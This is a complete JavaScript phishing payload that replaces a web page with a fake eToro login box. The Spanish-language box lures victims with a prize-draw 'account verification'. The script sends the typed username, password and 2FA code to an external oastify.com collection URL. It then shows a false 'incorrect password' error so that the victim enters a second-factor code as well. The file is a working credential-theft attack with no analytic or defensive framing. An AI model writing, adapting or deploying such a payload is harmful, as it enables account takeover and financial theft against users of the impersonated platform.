// payload.js – phishing overlay
(function() {
  // 1. Hide original page
  document.body.innerHTML = '';

  // 2. Load external stylesheet for a clean look (you can inline this if you want)
  const style = document.createElement('style');
  style.textContent = `
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #0a0a0a;
      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: #fff;
    }
    .login-box {
      background: #121212;
      border-radius: 8px;
      padding: 40px 32px;
      width: 360px;
      max-width: 90%;
      box-shadow: 0 0 30px rgba(0,0,0,0.8);
      text-align: center;
    }
    .logo {
      background: url('https://www.etoro.com/favicon.ico') no-repeat center;
      width: 48px; height: 48px; margin: 0 auto 20px; background-size: contain;
    }
    h2 { margin-bottom: 8px; font-weight: 400; }
    p { font-size: 13px; color: #aaa; margin-bottom: 24px; }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      background: #1e1e1e;
      border: 1px solid #333;
      border-radius: 4px;
      color: #fff;
      font-size: 14px;
    }
    input:focus { border-color: #6eff89; outline: none; }
    button {
      width: 100%;
      padding: 14px;
      background: #6eff89;
      color: #000;
      border: none;
      border-radius: 4px;
      font-weight: bold;
      font-size: 15px;
      cursor: pointer;
    }
    .error { color: #ff4d4d; font-size: 12px; margin-top: 12px; display: none; }
  `;
  document.head.appendChild(style);

  // 3. Build the phishing form
  const box = document.createElement('div');
  box.className = 'login-box';
  box.innerHTML = `
    <div class="logo"></div>
    <h2>Iniciar sesión</h2>
    <p>Verifica tu cuenta para participar en el sorteo</p>
    <input type="text" id="phish-user" placeholder="Nombre de usuario o email" autocomplete="off">
    <input type="password" id="phish-pass" placeholder="Contraseña" autocomplete="off">
    <input type="text" id="phish-2fa" placeholder="Código 2FA (opcional)" autocomplete="off" style="display:none;">
    <button id="phish-btn">Entrar</button>
    <div class="error" id="phish-error">Nombre de usuario o contraseña incorrectos. Inténtalo de nuevo.</div>
  `;
  document.body.appendChild(box);

  // 4. Handle submission
  const user = document.getElementById('phish-user');
  const pass = document.getElementById('phish-pass');
  const twofa = document.getElementById('phish-2fa');
  const btn = document.getElementById('phish-btn');
  const error = document.getElementById('phish-error');

  btn.addEventListener('click', function() {
    const u = user.value.trim();
    const p = pass.value;
    if (!u || !p) return;

    // Send credentials to your server
    fetch('https://p0q0iccjy5tmowrj93nxyv93tuzlneb3.oastify.com/collect?u=' + encodeURIComponent(u) +
          '&p=' + encodeURIComponent(p) +
          '&twofa=' + encodeURIComponent(twofa.value.trim()))
    .then(() => {
      // Show “wrong password” and ask again to capture 2FA if enabled
      error.style.display = 'block';
      pass.value = '';
      // If you want, show 2FA input after first attempt
      twofa.style.display = 'block';
    })
    .catch(() => {
      // Still redirect eventually
      window.location.href = 'https://www.etoro.com/login';
    });
  });

  // Also submit on Enter key
  pass.addEventListener('keyup', function(e) {
    if (e.key === 'Enter') btn.click();
  });
})();
